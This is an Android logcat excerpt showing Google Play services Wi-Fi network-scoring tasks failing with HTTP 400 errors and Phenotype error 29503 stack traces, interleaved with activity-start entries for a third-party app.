+12-05 18:56:32.415  2016  2602 E Volley  : [128] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:56:32.416  2016  4785 I NetRec  : [223] anai.c: Will retry failed rapid_refresh_scores_task task as standard refresh.
+12-05 18:56:32.421  2016  4785 W NetRec  : [223] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 2.
+12-05 18:56:32.434  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new rapid_refresh_scores_task refresh.
+12-05 18:56:32.439  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Completed rapid_refresh_scores_task score refresh task in 287 ms, returning 2
+12-05 18:56:32.445  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:4 result: 2 elapsed_millis: 303 uptime_millis: 303 exec_start_elapsed_seconds: 655 [CONTEXT service_id=218 ]
+12-05 18:56:30.435  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 3 lines
+12-05 18:56:31.434  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:32.446  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:32.449  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:32.475  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:5 exec_start_elapsed_seconds: 656 [CONTEXT service_id=218 ]
+12-05 18:56:32.476  2016  4785 I NetRec  : [223] anai.a: Refreshing scores for 1 networks.
+12-05 18:56:32.482  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:32.482  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:32.484  2016  2406 E apzj    : Phenotype API error. Event # ceqj@6c5a5ded, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:56:32.484  2016  2406 E apzj    : apyo: 29503
+12-05 18:56:32.484  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.484  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:56:32.485  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.485  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.485  2016  2603 E NetRec  : [129] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:56:32.485  2016  2603 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2603 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.485  2016  2603 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.485  2016  2603 W NetRec  : [129] amxc.a: No server tokens extracted.
+12-05 18:56:32.635  2016  2603 E Volley  : [129] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:56:32.636  2016  4785 W NetRec  : [223] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 1.
+12-05 18:56:32.638  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new refresh_scores_task refresh.
+12-05 18:56:32.639  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Completed refresh_scores_task score refresh task in 165 ms, returning 1
+12-05 18:56:32.641  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:5 result: 3 elapsed_millis: 176 uptime_millis: 176 exec_start_elapsed_seconds: 656 [CONTEXT service_id=218 ]
